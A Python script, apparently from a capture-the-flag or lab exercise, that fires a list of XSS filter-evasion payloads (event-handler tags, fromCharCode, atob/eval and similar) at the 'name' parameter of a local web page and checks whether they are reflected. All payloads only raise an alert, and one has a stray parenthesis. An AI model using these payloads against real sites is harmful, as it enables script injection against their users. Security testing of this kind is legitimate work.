import urllib.request
import urllib.parse
import socket
import ssl

# Target configuration
target_host = "127.0.0.1"
target_port = 33076
target_path = "/page"

def send_http_request(payload):
    """Send HTTP GET request with custom payload"""
    try:
        # Construct URL
        encoded_payload = urllib.parse.quote(payload, safe='')
        url = f"http://{target_host}:{target_port}{target_path}?name={encoded_payload}"
        
        print(f"\n[*] Testing payload: {payload}")
        print(f"[*] Full URL: {url}")
        
        # Send request
        with urllib.request.urlopen(url, timeout=10) as response:
            content = response.read().decode('utf-8')
            status = response.status
            headers = dict(response.headers)
            
            print(f"[*] Status Code: {status}")
            print(f"[*] Response Length: {len(content)}B")
            
            # Check for payload reflection
            if payload in content:
                print(f"[+] Payload REFLECTED in response")
            else:
                print(f"[-] Payload NOT reflected")
            
            # Print response snippet
            print(f"[*] Response snippet:\n{content[:400]}")
            
            return content
    except Exception as e:
        print(f"[!] Error: {type(e).__name__}: {str(e)}")
        return None

# Main testing
print("=" * 60)
print("XSS PAYLOAD TESTING (Standard Library Only)")
print("=" * 60)

# Test payloads systematically
payloads = {
    "TEMPLATE_LITERAL_1": "<img src=x onerror=alert(`XSS`)>",
    "TEMPLATE_LITERAL_2": "<svg/onload=alert(`XSS`)>",
    "STRING_CONCAT_1": "<img src=x onerror=alert('XS'+'S')>",
    "STRING_CONCAT_2": "<svg/onload=alert('XS'+'S')>",
    "FROM_CHARCODE_1": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "FROM_CHARCODE_2": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    "REGEX_SOURCE_1": "<img src=x onerror=alert(/XSS/.source)>",
    "REGEX_SOURCE_2": "<svg/onload=alert(/XSS/.source)>",
    "ENCODED_QUOTE_1": "<img src=x onerror=alert(&#39;XSS&#39;)>",
    "ENCODED_QUOTE_2": "<svg/onload=alert(String.raw`XSS`)>",
    "BASE64_DECODE_1": "<img src=x onerror=eval(atob('YWxlcnQoIlhTUyIp')))>"
}

for test_name, payload in payloads.items():
    print(f"\n{'-' * 60}")
    print(f"TEST: {test_name}")
    print(f"{'-' * 60}")
    response = send_http_request(payload)

print("\n" + "=" * 60)
print("TESTING COMPLETE")
print("=" * 60)

